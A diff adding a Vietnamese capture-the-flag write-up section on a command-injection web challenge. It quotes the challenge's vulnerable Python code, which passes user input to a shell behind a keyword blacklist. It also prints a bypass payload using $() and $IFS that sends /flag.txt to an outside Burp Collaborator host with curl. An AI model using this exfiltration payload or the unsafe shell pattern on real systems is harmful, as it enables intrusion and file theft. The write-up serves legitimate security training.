@@ -30,6 +30,7 @@
 - [Under Construction](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#under-construction)
 - [Youtube Downloader](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#youtube-downloader)
 - [Ping 0x01](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#ping-0x01)
+- [The Existed File]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -815,6 +816,53 @@ Tiếp tục là một thử thách có dạng command injection, khi tôi chèn
 Tiếp tục là 1 thử thách command injection, sau khi thử một loạt payload, thì việc xuống dòng để nối lệnh đã hoạt động:
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image150.png?raw=true)
+### The Existed File
+
+![img](151)
+
+![img](152)
+
+Tiếp tục là một thử thách liên quan đến Command Injection, lần này dựa vào đoạn code được cung cấp, tôi thấy rằng server có filter khá kỹ:
+
+    # Blacklist filter
+            blacklisted = [";", "&", "|", "&&", "cat", "head", "tail", "zip", "base64", "bash", "sh", "python", "`"]
+            is_blacklisted = any(bl in file_path for bl in blacklisted)
+
+            if is_blacklisted:
+                result = "Blacklist characters detected!"
+            else:
+                try:
+                    command = f"ls -l {file_path}"
+                    result = subprocess.check_output(command, shell=True).decode()
+                    if result:
+                        result = 'File is existed!'
+                except Exception as e:
+                    result = 'File is not existed'
+
+Với filter này, tôi không thể nối lệnh bằng cách dùng khoảng trắng, xuống dòng hay các toán tử `;`, `&`, `|`, `&&`,... và một số lệnh để đọc file cũng bị chặn. 
+
+Tuy nhiên, filter này không lọc `$()` (command substitution):
+
+![img](153)
+
+Tôi thử nhập `$(/flag.txt)`:
+
+![img](154)
+
+Chỉ nhận được thông báo file có tồn tại. Để đọc được nội dung của file, ý tưởng của tôi là sử dụng `Burp Collaborator` để tạo host lắng nghe, sau đó sử dụng `curl` để gửi nội dung file `/flag.txt` tới đây. Payload của tôi có dạng:
+
+    curl -F @/flag.txt <Burp_Collaborator_Address>
+
+Để bypass bộ lọc khoảng trắng, tôi sẽ thay thế thành `$IFS`, payload cuối cùng:
+
+    $(curl${IFS}-F${IFS}file=@/flag.txt${IFS}<Burp_Collaborator_Address>)
+
+Sau khi gửi request, tôi thu được flag:
+
+![img](155)
+
+![img](156)
+
 
 
 
